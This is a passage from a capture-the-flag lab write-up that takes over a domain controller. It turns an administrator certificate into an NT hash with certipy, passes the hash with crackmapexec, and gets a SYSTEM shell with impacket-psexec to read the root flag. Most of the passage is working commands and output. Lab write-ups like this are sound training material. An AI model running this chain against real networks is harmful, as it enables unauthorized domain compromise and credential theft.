With the administrator's PFX file in our possession, we can now utilize it for authentication.

`file ./administrator.pfx`:
```
./administrator.pfx: data
```

`certipy-ad auth -pfx ./administrator.pfx`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
❌

`sudo ntpdate 10.10.11.236`:
```
2024-11-06 18:38:16.206819 (+0100) +25198.364128 +/- 0.028072 10.10.11.236 s1 no-leap
CLOCK: time stepped by 25198.364128
```

`certipy-ad auth -pfx ./administrator.pfx`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef ←
```

`crackmapexec smb 10.10.11.236 -u 'Administrator' -H ':ae5064c2f62317332c88629e025924ef'`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\Administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!) ←
```

`crackmapexec smb 10.10.11.236 -u 'Administrator' -H ':ae5064c2f62317332c88629e025924ef' --shares`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\Administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
SMB         10.10.11.236    445    DC01             [*] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$          READ,WRITE      Remote Admin ←
SMB         10.10.11.236    445    DC01             C$              READ,WRITE      Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share 
```

`crackmapexec smb 10.10.11.236 -u 'Administrator' -H ':ae5064c2f62317332c88629e025924ef' -x 'whoami'`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\Administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
SMB         10.10.11.236    445    DC01             [+] Executed command via wmiexec
SMB         10.10.11.236    445    DC01             manager\administrator ←
```

`impacket-psexec 'manager.htb/Administrator@10.10.11.236' -hashes ':ae5064c2f62317332c88629e025924ef'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.236.....
[*] Found writable share ADMIN$ ←
[*] Uploading file ONpXwkOK.exe
[*] Opening SVCManager on 10.10.11.236.....
[*] Creating service swOf on 10.10.11.236.....
[*] Starting service swOf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system ←
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 566E-8ECA

 Directory of C:\Users\Administrator\Desktop

09/28/2023  01:27 PM    <DIR>          .
09/28/2023  01:27 PM    <DIR>          ..
11/04/2024  05:26 AM                34 root.txt ←
               1 File(s)             34 bytes
               2 Dir(s)   2,665,734,144 bytes free
```

`type root.txt`:
```
5b01d*************************** ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
